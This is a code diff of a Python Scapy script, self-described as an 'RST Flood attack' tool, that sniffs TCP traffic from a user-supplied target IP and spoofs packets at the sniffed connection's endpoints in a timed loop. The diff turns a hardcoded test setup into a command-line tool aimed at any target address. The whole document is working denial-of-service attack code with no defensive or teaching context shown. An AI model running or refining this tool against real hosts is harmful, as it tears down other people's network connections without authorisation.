@@ -1,5 +1,12 @@
 from scapy.all import *
+import argparse
 import time
+
+def parseArgs():
+	parser = argparse.ArgumentParser(description="Execute RST Flood attack on target IP address")
+	parser.add_argument("target_ip", type=str, help="Target IP address to flood communcations with RST packets")
+
+	return parser.parse_args()
 
 
 def spoof(src_ip, dst_ip, src_port, dst_port):
@@ -14,14 +21,13 @@ def spoof(src_ip, dst_ip, src_port, dst_port):
 		time.sleep(0.25)
 
 def listen(packet):
-	print(packet.summary)
 	ip = packet[0][1]
 	tcp = packet[0][1][1]
 	
-	#Scapy_Spoof.spoof(ip.src, ip.dst, tcp.sport, tcp.dport)
-	print(ip.src, " ", ip.dst, " ", tcp.sport, " ", tcp.dport)
-	Scapy_Spoof.spoof(ip.src, '185.230.61.161', tcp.sport, tcp.dport)
+	spoof(ip.src, ip.dst, tcp.sport, tcp.dport)
 
 
 if __name__ == '__main__':
-	sniff(filter='tcp and src 127.0.0.1', count=1, prn=listen)
+	args = parseArgs()
+
+	sniff(filter="tcp and src %s" % args.target_ip, count=1, prn=listen)
